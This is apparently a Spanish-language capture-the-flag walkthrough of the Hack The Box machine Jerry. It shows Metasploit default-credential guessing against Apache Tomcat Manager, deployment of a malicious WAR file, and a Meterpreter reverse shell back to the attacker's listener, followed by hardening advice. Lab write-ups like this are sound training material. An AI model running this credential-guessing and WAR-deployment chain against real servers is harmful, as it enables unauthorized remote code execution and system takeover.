---
title: "HTB Walkthrough: Jerry"
date: 2026-06-13
draft: false
description: "Walkthrough completo de la máquina Jerry de Hack The Box. Dificultad Easy, OS Windows Server 2012 R2. Credenciales por defecto en Apache Tomcat Manager, despliegue de WAR malicioso y shell directa como SYSTEM."
tags: ["HackTheBox", "Windows", "Easy", "Tomcat", "WAR", "DefaultCredentials", "RCE", "Metasploit", "jerry", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **Jerry** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Windows Server 2012 R2**. Apache Tomcat 7.0.88 expuesto con credenciales por defecto en el Manager. Las usamos para desplegar un WAR malicioso que nos entrega ejecución de código remota directamente como **NT AUTHORITY\SYSTEM** — sin escalada de privilegios necesaria.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                        |
|----------------|----------------------------------------------------------------|
| **Nombre**     | Jerry                                                          |
| **OS**         | Windows Server 2012 R2                                         |
| **Dificultad** | Easy                                                           |
| **IP**         | 10.129.136.9                                                   |
| **Técnicas**   | Default Credentials · Tomcat WAR Deploy · RCE como SYSTEM      |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.136.9
```

```
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

Escaneo de versiones:

```bash
nmap -sC -sV -p8080 10.129.136.9
```

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
```

*Puertos abiertos:*
- `8080` → **Apache Tomcat 7.0.88**

> **💡 Dato clave:** Tomcat expone el **Manager Application** en `/manager/html` — una interfaz web de administración que permite desplegar aplicaciones Java (archivos `.war`) directamente en el servidor. Autenticarse en el Manager equivale a tener RCE.

### 1.2 Enumeración del Tomcat Manager

Navegamos a `http://10.129.136.9:8080/manager/html`. El acceso requiere HTTP Basic Auth. Probamos credenciales por defecto con el módulo de Metasploit:

```bash
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(tomcat_mgr_login) > set RHOSTS 10.129.136.9
msf6 auxiliary(tomcat_mgr_login) > set RPORT 8080
msf6 auxiliary(tomcat_mgr_login) > run
```

```
[-] LOGIN FAILED: tomcat:admin    (Incorrect)
[-] LOGIN FAILED: tomcat:manager  (Incorrect)
[-] LOGIN FAILED: tomcat:tomcat   (Incorrect)
[+] LOGIN SUCCESSFUL: tomcat:s3cret
```

> **🔑 Credenciales encontradas:** `tomcat:s3cret`. Las credenciales por defecto de Tomcat están documentadas públicamente en el propio repositorio del proyecto — es una de las primeras comprobaciones en cualquier instalación de Tomcat expuesta.

> **💡 Conclusiones:** Acceso al Manager con credenciales por defecto. Podemos desplegar un WAR malicioso y obtener RCE directamente.

---

## 2. Explotación — Despliegue de WAR Malicioso

### 2.1 Análisis de la Vulnerabilidad

Un archivo **WAR (Web Application Archive)** es el formato estándar de empaquetado de aplicaciones Java para Tomcat. El Manager permite subir y desplegar WARs directamente desde la interfaz web. Al desplegar un WAR que contiene un JSP con código de reverse shell, Tomcat lo extrae, lo sirve como una aplicación web y al visitarlo ejecuta el código en el contexto del proceso de Tomcat.

```
Flujo normal:    upload WAR legítimo → Tomcat despliega la aplicación → sirve la app Java
Flujo malicioso: upload WAR malicioso → Tomcat despliega el JSP de shell
                 → visitar la URL activa el JSP → ejecución como SYSTEM
```

El proceso de Tomcat en esta máquina corre como la cuenta de máquina `JERRY$`, que tiene privilegios equivalentes a administrador local — acceso SYSTEM directo sin escalada.

### 2.2 Ejecución

```bash
msf6 > use exploit/multi/http/tomcat_mgr_deploy
msf6 exploit(tomcat_mgr_deploy) > set RHOSTS 10.129.136.9
msf6 exploit(tomcat_mgr_deploy) > set RPORT 8080
msf6 exploit(tomcat_mgr_deploy) > set HttpUsername tomcat
msf6 exploit(tomcat_mgr_deploy) > set HttpPassword s3cret
msf6 exploit(tomcat_mgr_deploy) > set PATH /manager/text
msf6 exploit(tomcat_mgr_deploy) > set LHOST tun0
msf6 exploit(tomcat_mgr_deploy) > set target 1
msf6 exploit(tomcat_mgr_deploy) > run
```

Dos opciones de configuración relevantes:
- **`PATH /manager/text`** — La ruta `/manager/text` es la API en texto plano que Metasploit usa para hacer el deploy programáticamente, sin procesar HTML.
- **`target 1` (Java Universal)** — Genera un payload Java puro (`.class`) que corre sobre la JVM de Tomcat, compatible con Windows y Linux sin depender de la arquitectura del SO.

```
[*] Uploading 6217 bytes as GiLuDM0r7bdIcsQyV.war ...
[*] Executing /GiLuDM0r7bdIcsQyV/UnHl.jsp...
[*] Undeploying GiLuDM0r7bdIcsQyV ...
[*] Meterpreter session 1 opened (10.10.14.211:4444 -> 10.129.136.9:49192)
```

```bash
meterpreter > getuid
Server username: JERRY$
```

✅ **Shell obtenida directamente como SYSTEM.** No se requiere escalada de privilegios.

---

## 3. Flags — Las Dos por el Precio de Una

Jerry tiene una particularidad: ambas flags están en un único archivo en el escritorio del Administrador, como guiño del creador al hecho de que se obtiene SYSTEM directamente sin pasar por un usuario sin privilegios.

```bash
meterpreter > cat "C:\\Users\\Administrator\\Desktop\\flags\\2 for the price of 1.txt"
```

```
user.txt
[flag]
root.txt
[flag]
```

> 🔑 Flag de usuario obtenida.

> 🏁 Flag de root obtenida.

---

## 4. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

1. **Recon** → Puerto 8080 con Apache Tomcat 7.0.88; Manager Application en `/manager/html`.
2. **Credenciales por defecto** → `tomcat_mgr_login` → `tomcat:s3cret`.
3. **WAR malicioso** → `tomcat_mgr_deploy` con Java Universal → JSP ejecutado por Tomcat → shell como `JERRY$` (SYSTEM).
4. **Flags** → Ambas en un único archivo en el escritorio del Administrador.

**Lo que aprendí con esta máquina:**

- **El Manager de Tomcat con credenciales por defecto es RCE.** No hace falta explotar ninguna vulnerabilidad del software — la funcionalidad legítima de despliegue de WARs es el vector. La seguridad de una instalación de Tomcat depende completamente de proteger el Manager con credenciales fuertes y restricción de acceso por IP.

- **Los payloads Java Universal son independientes de la arquitectura del SO.** A diferencia de los payloads nativos (`.exe` para Windows, ELF para Linux), un payload Java corre sobre la JVM sin importar si el sistema es x86, x64, Windows o Linux. En servidores de aplicaciones Java esto es especialmente útil porque la JVM siempre está disponible.

- **La cuenta de máquina en Windows tiene privilegios de administrador local.** `JERRY$` es la cuenta de máquina del sistema — no es un usuario administrador en el sentido tradicional, pero tiene acceso equivalente a SYSTEM sobre el sistema local. Cuando un servicio corre con esta cuenta, comprometer ese servicio da acceso total sin escalada adicional.

- **Cambiar las credenciales por defecto es el paso de hardening más básico y más frecuentemente omitido.** La contraseña `s3cret` ni siquiera es la contraseña por defecto de Tomcat — alguien la configuró conscientemente. Aun así, está en todas las listas de wordlists de Tomcat. Una contraseña débil y documentada en el Manager es funcionalmente equivalente a no tener contraseña.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| Credenciales por defecto en Tomcat Manager | Cambiar credenciales inmediatamente tras la instalación; usar contraseñas complejas y únicas |
| Tomcat Manager accesible desde internet | Restringir `/manager` por IP; deshabilitar el Manager en producción si no es necesario |
| Tomcat ejecutando como cuenta de máquina (SYSTEM) | Crear un usuario de servicio dedicado sin privilegios administrativos para ejecutar Tomcat |
| Despliegue de WARs sin restricciones | Deshabilitar el Manager si no se usa activamente; whitelist de WARs autorizados |
| Tomcat 7.0.88 sin soporte | Actualizar a Tomcat 9.x o 10.x con parches de seguridad activos |
